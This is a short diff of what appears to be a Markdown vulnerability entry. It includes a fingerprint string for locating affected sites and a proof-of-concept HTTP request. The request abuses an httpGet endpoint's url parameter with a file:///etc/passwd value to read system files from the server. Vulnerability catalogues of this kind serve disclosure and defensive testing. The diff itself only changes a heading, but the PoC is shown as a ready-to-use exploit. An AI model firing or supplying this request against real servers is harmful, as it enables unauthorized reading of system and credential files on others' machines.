@@ -8,7 +8,7 @@
 body="/static/index/js/jweixin-1.2.0.js"
 ```
 
-## poc
+## POC
 
 ```
 GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1
